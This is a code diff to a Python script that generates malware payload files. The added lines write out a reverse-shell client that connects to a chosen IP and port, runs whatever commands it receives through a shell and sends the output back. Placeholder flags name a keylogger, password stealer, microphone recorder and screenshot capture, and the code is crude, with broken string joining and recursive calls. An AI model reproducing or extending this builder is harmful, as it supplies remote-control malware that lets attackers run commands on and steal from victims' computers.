@@ -104,10 +104,37 @@ def generate():
         print("\nA a file with this name already exists.")
         exit(1)
     filename = open(title, 'w')
-    string = \
+    string = (\
 """
-    Script shit
-"""
+import socket
+import os
+import subprocess
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n""",
+'client.connect(('"'",ip,"'", ',' , port,'))\n'
+"""def recieve():
+    while True:
+            message = client.recv(1024)
+            message = message.decode()
+            print(message)
+            if not message:
+                recieve()
+            update = subprocess.check_output(message, shell=True)
+            response = update
+            print(response)
+            client.send(response)
+            recieve()
+        
+recieve()
+""")
+    string =  ''.join(string)
+    if keylogger == True:
+        string = string + "poop"
+    screenshot = False
+    recurring = False
+    emailupdate = False
+    passwdstealer = False
+    micrecorder = False
+    shell = False
     filename.write(string)
     filename.close()
 
